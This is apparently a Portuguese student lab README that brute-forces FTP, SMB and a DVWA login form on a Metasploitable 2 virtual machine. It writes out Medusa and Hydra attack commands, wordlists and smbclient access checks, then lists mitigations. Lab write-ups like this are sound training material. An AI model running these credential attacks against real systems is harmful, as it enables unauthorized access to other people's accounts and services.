# 🔐 bruteforce-medusa-kali-dio

Projeto prático voltado à simulação de ataques de força bruta em ambiente controlado, utilizando ferramentas de segurança ofensiva.

---

## 🎯 Objetivo

Este projeto tem como proposta demonstrar a execução de ataques de força bruta em serviços vulneráveis, utilizando a ferramenta **Medusa** no **Kali Linux**.

Os testes são realizados em máquinas virtuais vulneráveis, como **Metasploitable 2** e **DVWA**, com foco na documentação dos procedimentos, comandos utilizados e boas práticas de mitigação.

---

## 🖥️ Ambiente do Laboratório

* **Kali Linux** → Máquina atacante
* **Metasploitable 2** → Máquina alvo

  * IP: `192.168.56.1`
  * Usuário: `msfadmin`
  * Senha: `msfadmin`

---

## 🌐 Teste de Conectividade

Antes de iniciar os ataques, verifique a comunicação entre as máquinas:

```bash
ifconfig
ping 192.168.56.1
```

---

## 📂 Criação de Wordlists

Listas simples de usuários e senhas foram criadas para os testes:

```bash
# Lista de usuários
echo "msfadmin" > users.txt

# Lista de senhas
echo "msfadmin" > passwords.txt
```

---

## 🚀 Execução dos Ataques

### 🔑 Ataque em FTP

```bash
medusa -h 192.168.56.1 -u msfadmin -P passwords.txt -M ftp
```

Ou utilizando lista de usuários:

```bash
medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M ftp
```

---

### 📁 Ataque em SMB

```bash
medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M smbnt
```

---

### 📡 Validação de Acesso SMB

Após encontrar credenciais válidas:

```bash
smbclient -L //192.168.56.1 -U msfadmin
smbclient //192.168.56.1/tmp -U msfadmin
```

---

### 🌍 Ataque em Formulário Web (DVWA)

```bash
hydra -L users.txt -P passwords.txt 192.168.56.1 http-post-form "/dvwa/login.php\:username=^USER^&password=^PASS^&Login=Login"
```

---

## 📚 Aprendizados

* Funcionamento de ataques de força bruta em diferentes serviços
* Criação de wordlists adaptadas ao ambiente
* Uso de ferramentas open-source para automação de testes
* Análise dos resultados e validação de acessos obtidos

---

## 🛡️ Recomendações de Segurança

Para reduzir riscos de ataques desse tipo:

* Ativar autenticação multifator (MFA)
* Implementar políticas fortes de senha
* Limitar tentativas de login consecutivas
* Monitorar atividades suspeitas
* Manter sistemas e serviços atualizados
* Utilizar CAPTCHA em aplicações web
* Restringir acesso por IP quando possível

---

## ⚠️ Aviso

Este projeto deve ser utilizado **exclusivamente para fins educacionais** e em ambientes controlados.

